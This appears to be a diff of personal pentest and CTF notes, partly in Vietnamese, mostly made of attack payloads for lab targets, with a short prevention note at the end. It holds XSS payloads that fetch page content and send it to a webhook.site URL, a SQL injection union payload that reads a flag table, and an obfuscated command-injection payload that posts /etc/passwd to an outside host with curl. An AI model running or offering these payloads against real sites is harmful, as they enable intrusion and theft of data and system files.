@@ -2,6 +2,7 @@
 https://tsublogs.wordpress.com/2017/04/26/pentest-qa-cung-tsu-3-xss-upload-style/
 <h1>kaka</h1>
 alert(origin);
+"><script>alert(1);</script>
 
 script<script>fetch('https://webhook.site/fa3e73c6-2eb7-4297-9907-eda3b9dcdebb/'+fetch(https://note4.cyberjutsu-lab.tech/note).then(function (response) {return response.text())</script>
 script<script>alert(fetch(https%253a//note4.cyberjutsu-lab.tech/note).then(function%2b(response)%2b{return%2bresponse.text()})</script>
@@ -47,6 +48,8 @@ SQL payload bypass: http://localhost:8403/search.php?content=%22%25%27+union+sel
 - Real search: "%' union select 1,1,(select * from flag_ahihi) union SELECT id,title,content FROM news WHERE content LIKE '%a
 
 OS payload bypass: http://localhost:8403/search.php?content=%60cu%5c%0arl%20--data-binary%20%22@/et%5c%0ac/pas%5c%0aswd%22%20HTTPS://webhook.site/7264d41d-6fd0-4064-bcee-3f486400a2a3%60
+----------------------------------prototype -> XSS
+https://nhattruong.blog/2021/12/21/write-up-uit-ctf-wannagame/
 ---------------------------------------------------prevent
 xử dụng cơ chế nonce
 set httponly
